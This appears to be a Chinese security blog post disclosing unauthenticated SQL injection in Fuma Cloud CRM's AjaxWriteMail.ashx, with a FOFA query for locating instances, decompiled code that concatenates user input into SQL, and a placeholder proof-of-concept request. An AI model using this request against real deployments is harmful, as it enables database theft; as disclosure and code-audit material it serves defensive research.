---
title: "孚盟云CRM AjaxWriteMail.ashx 多处SQL注入漏洞"
source: https://mrxn.net/jswz/fumacrm-AjaxWriteMail-SQLi.html
asset_dir: assets/孚盟云crm-ajaxwritemail.ashx-多处sql注入漏洞
---

# 孚盟云CRM AjaxWriteMail.ashx 多处SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/10/13 11:25
* 677浏览
* [0评论](#comment)
* 23分钟阅读

深入探索

鉴权

客户关系管理

SaaS


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

上海孚盟软件有限公司是一家专业的外贸SaaS服务和行业解决方案提供商。其旗下产品孚盟云AjaxWriteMail.ashx接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的远程攻击者除了可以利用 SQL注入漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

# 影响版本

# fofa语法

> app="孚盟软件-孚盟云"

# 漏洞分析

深入探索

授权

服务器安全服务

漏洞扫描器

直接看 `AjaxWriteMail.ashx` 对应的dll文件 `FumaCRM_BS.NewWeb.dll` 里有关 **AjaxWriteMail** 方法的实现如下

```
public void ProcessRequest(HttpContext context)
{
  try
  {
    if (UserCookie.GetCookieValue("empId") == null)
      return;
    string str1 = FumaCRM_BS.Utility.Encrypt.Encrypt.DesDecrypt(UserCookie.GetCookieValue("empId"));
    string str2 = context.Request["method"].ToString();
    string empty1 = string.Empty;
    string empty2 = string.Empty;
    StringBuilder builder = new StringBuilder();
    Hashtable hashtable = new Hashtable();
    string s = str2;
    // ISSUE: reference to a compiler-generated method
    switch (\u003CPrivateImplementationDetails\u003E.ComputeStringHash(s))
    {
      case 484109797:
        if (!string.op_Equality(s, "updateLastedContactTable"))
          break;
        string str3 = context.Request["mails"] == null ? "" : context.Request["mails"].ToString();
        if (string.IsNullOrEmpty(str3))
          break;
        string str4 = str3;
        char[] chArray = new char[1]{ ';' };
        foreach (string mail in str4.Split(chArray))
          this.updateLastedContactTable(mail, str1);
        break;
```

深入探索

服务器

app

技术文章订阅

当**method=updateLastedContactTable**时，进入`updateLastedContactTable`方法

```
private void updateLastedContactTable(string mail, string empId)
{
  string empty1 = string.Empty;
  bool flag = false;
  string sql1;
  if (mail.IndexOf('@') > -1)
    sql1 = $"select 1 from tmLastedContact where ContactMailAddress = '{mail}' and OwnerID='{empId}'";
  else
    sql1 = $"select 1 from tmLastedContact where ContactEmpId = '{mail}' and OwnerID='{empId}'";
  DataTable dataTable1 = this._createPageManager.SearchSql(sql1, "");
```

**empId**和参数**mails**按照分号分割后被直接拼接进SQL语句中执行，期间无过滤或校验，从而造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。empId参数是被直接拼接金SQL语句，也是注入点。

`getContactList`、`saveCategory`、`GetCustInfo`、`excetSpLastTrackInfo`、`SendMail_send`和`SendMail`方法也存在同样的拼接导致的SQL注入漏洞。

[![孚盟云CRM AjaxWriteMail.ashx 多处SQL注入漏洞](images/img-001-086a15f09aa2.webp)](https://image.mrxn.net/be6ec48245114db884e57ea48ed2bb1f.webp)

[![孚盟云CRM AjaxWriteMail.ashx 多处SQL注入漏洞](images/img-002-e8777d02004f.webp)](https://image.mrxn.net/069519473aef4c1eb34da1365888f546.webp)

[![孚盟云CRM AjaxWriteMail.ashx 多处SQL注入漏洞](images/img-003-0f7582f28d68.webp)](https://image.mrxn.net/42b31689f6a14d97aeb6143973035e53.webp)

[![孚盟云CRM AjaxWriteMail.ashx 多处SQL注入漏洞](images/img-004-87c0176dca95.webp)](https://image.mrxn.net/dc377d5fd5f543d89d8dcb4935fe3d7c.webp)

[![孚盟云CRM AjaxWriteMail.ashx 多处SQL注入漏洞](images/img-005-071659e8ed63.webp)](https://image.mrxn.net/dfb788da32164d21b865fd9610a26b31.webp)

[![孚盟云CRM AjaxWriteMail.ashx 多处SQL注入漏洞](images/img-006-d00975e6daf1.webp)](https://image.mrxn.net/146b60234d0645e58e95b249faffc2dc.webp)

# 漏洞复现

```
POST /m/Dingding/Ajax/AjaxWriteMail.ashx HTTP/1.1
Host: fumacrm.mrxn.net
Cookie: UserCookie={"empId":"SQLI_POC","corpId": "1"}
Content-Type: application/x-www-form-urlencoded

method=updateLastedContactTable&mails=SQLI_POC
```

[![孚盟云CRM AjaxWriteMail.ashx 多处SQL注入漏洞](images/img-007-5ad642572d45.webp)](https://image.mrxn.net/6d10941c329d4655b1bac6a6fe08f72b.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[孚盟云CRM AjaxWriteMail.ashx 多处SQL注入漏洞](https://mrxn.net/jswz/fumacrm-AjaxWriteMail-SQLi.html)  
文章链接：<https://mrxn.net/jswz/fumacrm-AjaxWriteMail-SQLi.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/fumacrm-AjaxWriteMail-SQLi.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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